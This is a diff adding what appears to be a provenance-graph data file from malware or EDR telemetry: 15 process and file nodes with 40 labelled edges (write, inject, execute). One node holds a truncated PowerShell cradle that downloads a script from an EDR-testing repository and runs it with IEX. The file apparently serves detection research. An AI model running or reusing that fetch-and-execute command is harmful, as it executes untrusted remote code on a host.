@@ -1,0 +1,58 @@
+15
+MP*-ns9B66.tmp 
+MP-FTPServer.exe 
+MF-C:\Users\admin\AppData\Local\Temp\setup_avrokeyboard_5
+TP*-filezilla.exe 
+SO-https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_
+TP*-MincedCrackexe_cyb3a.exe 
+MF-\Users\admin\AppData\Local\Temp\06ad76f4b19be8706f98441d926142af824bd2983217f6c2c02201dbb07d0224.zip
+MP-ns996E.tmp
+MP-Scan20230717_newshipment 202333pdf.exe
+TF-C:\Users\admin\AppData\Local\Temp\RESF2C4.tmp
+MP*-sc.exe
+MF-attrib.exe
+MP-UninsHs.exe
+MP-OUTLOOK.EXE 
+MF-C:\Users\admin\AppData\Local\Temp\xnoobx.c
+40
+0 1 FR
+0 2 WR
+1 2 CD
+0 3 IJ
+1 3 IJ
+3 2 RD
+4 0 RF
+4 1 RF
+3 4 ST
+0 5 IJ
+1 5 IJ
+5 2 WR
+3 5 IJ
+5 4 ST
+0 6 WR
+1 6 WR
+3 6 WR
+5 6 CD
+0 7 FR
+7 2 CD
+3 7 UK
+0 8 UK
+1 9 WR
+5 9 EX
+1 10 FR
+10 2 WR
+4 10 RF
+5 10 IJ
+10 6 WR
+10 9 WR
+1 11 RD
+5 11 EX
+10 11 UK
+12 2 EX
+4 12 RF
+5 12 UK
+13 4 ST
+13 6 WR
+13 9 EX
+13 14 UK
+
